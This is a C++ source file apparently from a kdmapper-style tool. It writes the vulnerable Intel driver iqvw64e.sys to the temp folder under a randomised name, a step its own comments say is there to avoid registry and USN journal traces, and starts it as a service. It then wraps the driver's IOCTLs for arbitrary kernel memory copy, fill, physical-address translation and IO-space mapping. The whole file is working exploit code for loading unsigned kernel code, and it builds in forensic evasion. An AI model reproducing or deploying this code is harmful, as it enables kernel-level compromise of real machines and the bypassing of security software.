#include "intel_driver.hpp"


// Local variables:
char driver_name[100]; //"iqvw64e.sys"


HANDLE intel_driver::Load(LPCWSTR SymbolicLink) {
	DriverMapper::DISPATCH_FUNCTIONS* LocalTriggerFunctions =
		(DriverMapper::DISPATCH_FUNCTIONS*)DriverMapper::GetLoaderResource(L"TriggerFunctions");
	int* LocalIndexOfImplementedFunctions = (int*)DriverMapper::GetLoaderResource(L"IndexOfImplementedFunctions");
	ULONG64* LocalRunningDriversCount = (ULONG64*)DriverMapper::GetLoaderResource(L"RunningDriversCount");
	DriverMapper::FILE_NAME* LocalDriverNames = (DriverMapper::FILE_NAME*)DriverMapper::GetLoaderResource(L"DriverNames");
	srand((unsigned)time(NULL) * GetCurrentThreadId());


	//from https://github.com/ShoaShekelbergstein/kdmapper as some Drivers takes same device name
	if (utils::IsRunning(SymbolicLink)) {
		Log(L"[-] \\Device\\Nal is already in use." << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	//Randomize name for log in registry keys, usn jornal and other shits
	memset(driver_name, 0, sizeof(driver_name));
	static const char alphanum[] =
		"abcdefghijklmnopqrstuvwxyz"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	int len = rand() % 20 + 10;
	for (int i = 0; i < len; ++i)
		driver_name[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

	Log(L"[<] Loading vulnerable driver, Name: " << utils::GetDriverNameW(driver_name) << std::endl);

	std::wstring driver_path = utils::GetDriverPath(driver_name);
	if (driver_path.empty()) {
		Log(L"[-] Can't find TEMP folder" << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	_wremove(driver_path.c_str());

	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver))) {
		Log(L"[-] Failed to create vulnerable driver file" << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	if (!service::RegisterAndStart(driver_path)) {
		Log(L"[-] Failed to register and start service for the vulnerable driver" << std::endl);
		_wremove(driver_path.c_str());
		return INVALID_HANDLE_VALUE;
	}

	HANDLE result = CreateFileW(INTELDRIVER_SYMLINK, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!result || result == INVALID_HANDLE_VALUE)
	{
		Log(L"[-] Failed to load driver iqvw64e.sys" << std::endl);
		DriverMapper::Unload(result, driver_name);
		return INVALID_HANDLE_VALUE;
	}


	// Fill up the trigger function table with the handled dispatches by the intel driver:
	LocalTriggerFunctions->Function0 = &intel_driver::MemCopy;
	LocalTriggerFunctions->Function1 = &intel_driver::SetMemory;
	LocalTriggerFunctions->Function2 = &intel_driver::GetPhysicalAddress;
	LocalTriggerFunctions->Function3 = &intel_driver::MapIoSpace;
	LocalTriggerFunctions->Function4 = &intel_driver::UnmapIoSpace;
	for (int IndexOfImplemented = 0; IndexOfImplemented < VULNERABLE_IOCTL_COUNT; IndexOfImplemented++) {
		LocalIndexOfImplementedFunctions[IndexOfImplemented] = (int)*LocalRunningDriversCount - 1;
	}
	RtlCopyMemory(LocalDriverNames[(int)*LocalRunningDriversCount - 1].DriverName, driver_name, strlen(driver_name) + 1);
	return result;
}


char* intel_driver::GetDriverName() {
	return driver_name;
}


bool intel_driver::MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size) {
	if (!destination || !source || !size)
		return 0;

	COPY_MEMORY_BUFFER_INFO copy_memory_buffer = { 0 };

	copy_memory_buffer.case_number = 0x33;
	copy_memory_buffer.source = source;
	copy_memory_buffer.destination = destination;
	copy_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(device_handle, IntelDriverIoctl, &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::SetMemory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size) {
	if (!address || !size)
		return 0;

	FILL_MEMORY_BUFFER_INFO fill_memory_buffer = { 0 };

	fill_memory_buffer.case_number = 0x30;
	fill_memory_buffer.destination = address;
	fill_memory_buffer.value = value;
	fill_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(device_handle, IntelDriverIoctl, &fill_memory_buffer, sizeof(fill_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::GetPhysicalAddress(HANDLE device_handle, uint64_t address, uint64_t* out_physical_address) {
	if (!address)
		return 0;

	GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = { 0 };

	get_phys_address_buffer.case_number = 0x25;
	get_phys_address_buffer.address_to_translate = address;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(device_handle, IntelDriverIoctl, &get_phys_address_buffer, sizeof(get_phys_address_buffer), nullptr, 0, &bytes_returned, nullptr))
		return false;

	*out_physical_address = get_phys_address_buffer.return_physical_address;
	return true;
}

uint64_t intel_driver::MapIoSpace(HANDLE device_handle, uint64_t physical_address, uint32_t size) {
	if (!physical_address || !size)
		return 0;

	MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = { 0 };

	map_io_space_buffer.case_number = 0x19;
	map_io_space_buffer.physical_address_to_map = physical_address;
	map_io_space_buffer.size = size;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(device_handle, IntelDriverIoctl, &map_io_space_buffer, sizeof(map_io_space_buffer), nullptr, 0, &bytes_returned, nullptr))
		return 0;

	return map_io_space_buffer.return_virtual_address;
}

bool intel_driver::UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t size) {
	if (!address || !size)
		return false;

	UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer = { 0 };

	unmap_io_space_buffer.case_number = 0x1A;
	unmap_io_space_buffer.virt_address = address;
	unmap_io_space_buffer.number_of_bytes = size;

	DWORD bytes_returned = 0;

	return DeviceIoControl(device_handle, IntelDriverIoctl, &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0, &bytes_returned, nullptr);
}